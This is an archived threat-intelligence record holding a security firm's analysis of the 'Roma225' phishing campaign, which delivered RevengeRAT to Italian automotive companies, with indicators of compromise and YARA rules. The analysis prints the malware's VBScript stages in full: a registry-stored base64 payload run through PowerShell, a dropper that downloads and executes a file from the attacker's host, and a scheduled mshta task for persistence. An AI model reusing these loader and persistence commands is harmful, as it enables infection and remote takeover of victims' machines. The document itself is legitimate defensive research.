{
    "id": "a9f02646-9c51-49f0-802a-1dfce08ced7f",
    "created_at": "2022-10-25T16:48:10.914442Z",
    "updated_at": "2025-03-27T02:15:06.971112Z",
    "deleted_at": null,
    "sha1_hash": "758d6fbdac76f237dea044f336fc70cdadc5ccdc",
    "title": "The Enigmatic “Roma225” Campaign",
    "authors": "",
    "file_creation_date": "2019-03-13T08:29:46Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 1007800,
    "plain_text": "# The Enigmatic “Roma225” Campaign\n\n**[blog.yoroi.company/research/the-enigmatic-roma225-campaign](https://blog.yoroi.company/research/the-enigmatic-roma225-campaign/)**\n\nZLAB-YOROI December 27, 2018\n\n\n-----\n\n## Introduction\n\nThe Cybaze-Yoroi ZLab researchers investigated a recent espionage malware implant\nweaponized to target companies in the Italian automotive sector. The malware was\nspread through well written phishing email trying to impersonate a senior partner of\none of the major Brazilian business law firms: “Veirano Advogados”.\n\nThe malicious email intercepted during the CSDC operations contains a PowerPoint\nadd-in document (“.ppa” extension), armed with auto-open VBA macro code.\n\n_Figure 1. Popup displayed at the .ppa file opening_\n\n## Technical analysis\n\nThe macro code in the .ppa file contains a simple instruction invoking the “mshta.exe”\ntool to download and execute the next-stage of the dropper retrieved from\n“hxxps://minhacasaminhavidacdt.blogspot[.com/”.\n\n\n-----\n\n_Figure 2. Macro extracted from .ppa document_\n\nThe Blogspot hosted web page downloaded by mshta.exe appears innocent-looking\nto a quick skim through: opening it into the browser shows a perfectly rendered\nwork-in progress blog page.\n\n_Figure 3. Home page of the Blogger drop url_\n\nBut a deeper inspection of its source code reveals an interesting snippet inserted into\nan invisible blog post: this ghost article contains VBScript code.\n\n_Figure 4. Visual Basic Script hidden behind the web page_\n\nIt’s funny to see the malware author tried to attribute the paternity of the script to\n“Microsoft Corp.”, adding pieces of comments belonging to legit Microsoft utilities:\n\n\n-----\n\n_‘ Copyright: Microsoft Corp._\n_‘_\n_‘ This script is designed to be used only for scheduled tasks(s)._\n_‘ There is no extensive error check, and will not dump the output from the Powershell_\n_CmdLet._\n_‘_\n_‘ Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}_\n\nThese comments are in fact part of the “SyncAppvPublishingServer” utility, commonly\ndeployed into Windows 10 machines at\n“C:\\Windows\\System32\\SyncAppvPublishingServer.vbs”. Anyway, the remaining part of\nthe script is responsible to execute a series of malicious actions:\n\nStore a base64 encoded version of the “RevengeRAT” payload into registry key\nlocated at “HKCU\\AppEvents\\Values”\n\nCreateObject(\"Wscript.Shell\").regwrite \"HKCU\\AppEvents\\Values\",\n\"TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]\", \"REG_SZ\"\n\nDecode and execute of the stored payload\n\nSet A0102030405 = CreateObject(\"WScript.Shell\")\nDim CDT0908087CDT\nCDT0908087CDT = \"cmd.\" + \"exe /C rundll32.\" + \"exe\njavascript:\"\"\\..\\mshtml,RunHTMLApplication\n\"\";document.write();h=new%20ActiveXObject(\"\"WScript.Shell\"\").run(\"\"cmd.\" + \"exe /c\npower\" + \"shell -\" + \"Execution\" + \"Policy Bypass -windows\" + \"tyle hidden -noexit\n-Command [Reflection.\" + \"Assembly]::Load([Convert]::FromBase64String((GetItemProperty HKCU:\\AppEvents).Values)).EntryPoint\" + \".Invoke($N\" + \"ull,$\" +\n\"Null)\"\",0,true);\"\nA0102030405.run CDT0908087CDT, vbHide\n\nCreate and execute another VBScript into “%AppData%\\Local\\Temp\\Z3j.vbs”,\ncapable to download a new payload from the remote destination\n“hxxp://cdtmaster.com[.]br”\n\nSet XbonXo = CreateObject(\"WScript.Shell\")\nDim XoowA83AC\nXoowA83AC = \"c\" + \"M\" + \"d /c cd %TEMP% &@echo Z6h = \"\"h\" + \"t\" +\n\"tp://cdtmaster.com.br/Document.\" + \"mp3\"\">>Z3j.vbs &@echo M2l =\nM5t(\"\"R]Qc[S\\b<SfS\"\")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(\"\"\n\n[af[Z@<f[ZVbb^\"\"))>>Z3j.vbs &@echo M1s.Open M5t(\"\"USb\"\"), Z6h, False>>Z3j.vbs\n&@echo M1s.send (\"\"\"\")>>Z3j.vbs &@echo Set E3i =\nCreateObject(M5t(\"\"OR]RP<ab`SO[\"\"))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo\nE3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo\nE3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo\nE3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To\nLen(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k =\nChr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs\n&@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs &\ntimeout 2 & DOCUMENT.EXE\"\nXbonXo.Run XoowA83AC, vbHide\n\n\n-----\n\n“hxxps://pocasideiascdt.blogspot[.]com/” parameter every two hours. This URL\npoints to web page which actually is a mirror of the\n“https://minhacasaminhavidacdt.blogspot[.]com/” one.\n\nDim OUGo57658586GFFJHG\nSet OUGo57658586GFFJHG = CreateObject(\"WScript.Shell\")\nasdmmmc= \"c\" + \"Md /c Sc\" + \"hTa\" + \"sks /Cre\" + \"ate /sc MIN\" + \"UTE /MO 120 /TN\nOfficeData /TR \"\"m\" + \"sh\" + \"ta.\" + \"exe h\" + \"ttp\" +\n\"s://pocasideiascdt.blogspot.com/\"\" /F \"\nOUGo57658586GFFJHG.Run asdmmmc, vbHide\nself.close\n\n_Figure 5. Scheduled task for persistency_\n\nSumming up, the last stages of the infection chain are designed to install a\nRevengeRAT variant hidden into a regkey and run the “outlook.exe” executable\nextracted by the “Document.exe” binary, retrieved from\n“hxxp://cdtmaster.com[.]br/Document.mp3”.\n\nThe following image briefly shows the malware infection chain:\n\n\n-----\n\n_Figure 6. Roma255 infection chain_\n\n### RevengeRAT Payload\n\nOnce executed, the RAT immediately contacts its command and control servers\nsending victim machine’s information. In the analyzed sample, the author configured\ntwo different C2 destinations: “office365update[.]duckdns.org” and “systen32.ddns[.]net“.\n\n_Figure 7 Configuration of the RevengeRAT_\n\n\n-----\n\nboth the remote C2 were down, so it was only possible to emulate the server\nbehavior in order to analyze the information sent by the RAT.\n\nAnyway, the malware establishes a TCP connection with the server and sends to it the\nfollowing stream:\n\n_Figure 8. RevengeRAT check-in data_\n\nAt first sight, it’s possible to spot a repeated sequence of chars used as separator\nbetween the data fields:\n\n**_roma225_**\n\nThis string have been chosen by the attacker during the preparation of the malware,\nusing the customization functionalities provided by the RevengeRAT builder. Splitting\nand decoding the data stream, information becomes clearer:\n\n_Figure 9. decoded check-in data_\n\nAs told before, the C2s were unresponsive at time of writing, however their latest IP\nresolution indicates the infrastructure of the attacker could be located in different\ncountries.\n\nFor instance, the domain “office365update[.]duckdns.org” resolved to the\n184.75.209.169 IP addresss, geolocated in Canada.\n\n\n-----\n\nMoreover, “systen32.ddns[.]net” resolved to the 138.36.3.228 IP, geolocated in Brazil.\n\n## Document.exe\n\nThe “Document.exe” file is hosted at “cdtmaster.com[.]br” and is\nactually downloaded into the victim machine by the “Z3j.vbs” script.\nThis PE32 file is characterized by the Pokemon Megaball image used\nas program icon and its unique purpose is to deploy and run the\n“Outlook.exe” payload.\n\nExtracting static PE information from this last sample, reveals\nreferences to the “SendBlaster” application, a program used to deliver newsletters.\nHere, another interesting fact comes up: this product is currently developed by the\nItalian firm eDisplay Srl, so, in addition to the “roma225” separator, represents\nanother direct reference to the Italian landscape.\n\n_Figure 10. Outlook.exe_\n_static information_\n\nWhen the “Outlook.exe” payload\nis executed, it remains\napparently quiet: no outgoing\nnetwork traffic or file system\nmodifications; however it binds\na listening TCP socket on\nlocalhost: “tcp://127.0.0.1:49356“.\n\nCybaze-Yoroi ZLab researchers\nare still dissecting the\n_Outlook.exe sample to extract its_\nreal behavior.\n\n\n-----\n\nAfter this first analysis, it’s difficult to attribute the attack to a specific threat actor. In\nthe past, RevengeRAT variants were also used by APT groups such as The Gorgon\n[Group, the enigmatic threat actor tracked by the Unit42 researchers, author of cyber](https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/)\nespionage campaigns against UK, Spain, Russia and US governmental organization.\nHowever, the source code of the RAT has been publicly leaked few years ago and\ncould be actually part of a multitude of cyber arsenals, more or less sophisticated.\n\nAnyway, there are TTP in common with Unit42 report, such as the usage of shared\ninfrastructure (in the specific case the Blogger service) as drop-server and other\npopular RAT as final backdoor (i.e. njRAT).\n\nIn fact, the “cdtmaster.com.]br” hosts other suspicious files such as the “nj.mp3” binary,\nwhich actually is a njRAT variant. All the other files are still under investigation.\n\n_Figure 11. Malware hosted on ctdmaster.com[.br_\n\n# Indicator Of Compromise\n\nDropurl:\n\nhxxps://minhacasaminhavidacdt.blogspot[.]com\nhxxps://pocasideiascdt.blogspot[.]com/\nhxxp://cdtmaster.]com.br\n177.85.98.242\nC2 (RevengeRAT):\n\noffice365update[.]duckdns.org\n184.75.209.169\nsysten32.ddns[.]net\n\n\n-----\n\n_HKCU\\AppEvents\\<”Values”>_\nHash:\n\n4211e091dfb33523d675d273bdc109ddecf4ee1c1f5f29e8c82b9d0344dbb6a1\ne8a765ec824881e1e78defd7c011da735f3e3b954aaf93a4282b6455a1b9afcc\n702e5cc9462e464c8c29c832fe0d1ecd5cd7740cc2cbceecfd70e566da8194a1\n\n# Yara Rules\n\nrule Rooming_List_Advogados_e_Seguranca_21_12_2018{\n\nmeta:\ndescription = \"Yara Rule for revengeRAT_roma225\"\n\nauthor = \"Cybaze Zlab_Yoroi\"\nlast_updated = \"2018-12-21\"\ntlp = \"white\"\ncategory = \"informational\"\n\nstrings:\n$a1 = {56 00 42 00 41}\n$a2 = {4D F3 64 75 6C 6F 31}\n$a3 = {4D 73 68 74 61}\n$b = \"Auto_Open\"\n$c = \"Shell\"\n$d = \"https://minhacasaminhavidacdt.blogspot.com\"\n$e = {D0 CF 11 E0 A1 B1 1A E1}\n\ncondition:\n$b and $c and $d and $e and 1 of ($a*)\n}\n\nrule revengeRAT_21_12_2018{\n\nmeta:\ndescription = \"Yara Rule for revengeRAT_roma225\"\nauthor = \"Cybaze Zlab_Yoroi\"\nlast_updated = \"2018-12-21\"\ntlp = \"white\"\ncategory = \"informational\"\n\nstrings:\n$a1 = \"FromBase64String\"\n$a2 = {17 00 38 72 1F 00 00 20 D7 ?? ?? ?? 20 47}\n$b = {4D 5A}\n$c = {65 5A 33 78 63 6B 4A 39 4B 51 47 4B 50 36 33 55 37 39 67}\n$d = \"RevengeFUD0000000.exe\"\n$e = \"7ec6b2a4-a8e7\"\n\ncondition:\n$b and $c and $d and $e and 1 of ($a*)\n\n}\n\n\n-----\n\nmeta:\ndescription = \"Yara Rule for revengeRAT_roma225\"\nauthor = \"Cybaze Zlab_Yoroi\"\nlast_updated = \"2018-12-21\"\ntlp = \"white\"\ncategory = \"informational\"\n\nstrings:\n$a1 = \"Dispose\"\n$a2 = {53 00 65 00 6E 00 64 00 42 00 6C 00 61 00 73 00 74 00 65 00 72}\n$b = {4D 5A}\n$c = {49 4D 4E 64 48 49 37 49 34 69 57 37 46 6E 73 6F 49 38}\n$d = \"ScreenBooking4\"\n$e = \"capturaTela\"\n\ncondition:\n$b and $c and $d and $e and 1 of ($a*)\n\n}\n\nrule Document_exe_21_12_2018{\n\nmeta:\n\ndescription = \"Yara Rule for revengeRAT_roma225\"\nauthor = \"Cybaze Zlab_Yoroi\"\n\nlast_updated = \"2018-12-21\"\ntlp = \"white\"\n\ncategory = \"informational\"\n\nstrings:\n$a1 = \"Dispose\"\n\n$a2 = {F5 38 7E 26 EA 99}\n$b = {4D 5A}\n\n$c = {6C 38 6E 78 4A 79 30 6E 34 616D 4A 74 4F 67 00 57}\n$d = \"4System\"\n\n$e = {53 6B 79 70 65 20 54 65 63 68 6E 6F 6C 6F 67 69 65 73}\n\ncondition:\n$b and $c and $d and $e and 1 of ($a*)\n\n}\n\n_This blog post was authored by Testa Davide, Antonio Farina, Luca Mella, Antonio Pirozzi of_\n_Cybaze-Yoroi Z-LAB_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.12.27.Roma225_Campaign/The%20Enigmatic%20Roma225%20Campaign.pdf"
    ],
    "report_names": [
        "The Enigmatic Roma225 Campaign"
    ],
    "threat_actors": [
        {
            "id": "6c4e4b91-1f98-49e2-90e6-435cea8d3d53",
            "created_at": "2022-10-25T16:07:23.693797Z",
            "updated_at": "2025-03-27T02:02:09.924056Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "ATK 92",
                "Pasty Draco",
                "Subaat",
                "TAG-CR5"
            ],
            "source_name": "ETDA:Gorgon Group",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Atros2.CKPN",
                "Bladabindi",
                "CinaRAT",
                "Crimson RAT",
                "ForeIT",
                "Jorik",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "MSIL",
                "MSIL/Crimson",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Origin Logger",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "SEEDOOR",
                "Scarimson",
                "Socmer",
                "Yggdrasil",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "66fc98f4-8978-401e-9b73-81c3d5f1e44c",
            "created_at": "2024-05-01T02:03:08.050109Z",
            "updated_at": "2025-03-27T02:05:17.327953Z",
            "deleted_at": null,
            "main_name": "COPPER FIELDSTONE",
            "aliases": [
                "Gorgon Group",
                "Green Havildar ",
                "Mythic Leopard ",
                "Operation C-Major ",
                "Operation Transparent Tribe ",
                "Pasty Draco ",
                "ProjectM ",
                "Storm-0156 ",
                "APT36 "
            ],
            "source_name": "Secureworks:COPPER FIELDSTONE",
            "tools": [
                " DarkComet",
                " LuminosityLink",
                " Peppy",
                " njRAT",
                "Crimson RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "18278778-fa63-4a9a-8988-4d266b8c5c1a",
            "created_at": "2023-01-06T13:46:38.769816Z",
            "updated_at": "2025-03-27T02:00:02.914024Z",
            "deleted_at": null,
            "main_name": "The Gorgon Group",
            "aliases": [
                "ATK92",
                "G0078",
                "Pasty Gemini",
                "Gorgon Group",
                "Subaat"
            ],
            "source_name": "MISPGALAXY:The Gorgon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "97fdaf9f-cae1-4ccc-abe2-76e5cbc0febd",
            "created_at": "2022-10-25T15:50:23.296989Z",
            "updated_at": "2025-03-27T02:00:55.432751Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "Gorgon Group"
            ],
            "source_name": "MITRE:Gorgon Group",
            "tools": [
                "NanoCore",
                "QuasarRAT",
                "Remcos",
                "njRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716490,
    "ts_updated_at": 1743041706,
    "ts_creation_date": 1552465786,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/758d6fbdac76f237dea044f336fc70cdadc5ccdc.pdf",
        "text": "https://archive.orkl.eu/758d6fbdac76f237dea044f336fc70cdadc5ccdc.txt",
        "img": "https://archive.orkl.eu/758d6fbdac76f237dea044f336fc70cdadc5ccdc.jpg"
    }
}